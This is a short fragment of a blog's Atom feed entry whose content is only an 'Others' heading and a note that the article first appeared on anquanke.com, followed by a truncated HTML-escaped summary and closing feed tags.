    <content type="html"><![CDATA[<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p>The article was first published in:<a href="https://www.anquanke.com/post/id/84774" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84774</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Others&quot;&gt;&lt;a href=&quot;#Others&quot; class=&quot;headerlink&quot; title=&quot;Others&quot;&gt;&lt;/a&gt;Others&lt;/h2&gt;&lt;p&gt;The article was first published in:&lt;a href=&quot;https://ww
      
    
    </summary>
    
    
  </entry>
  
</feed>
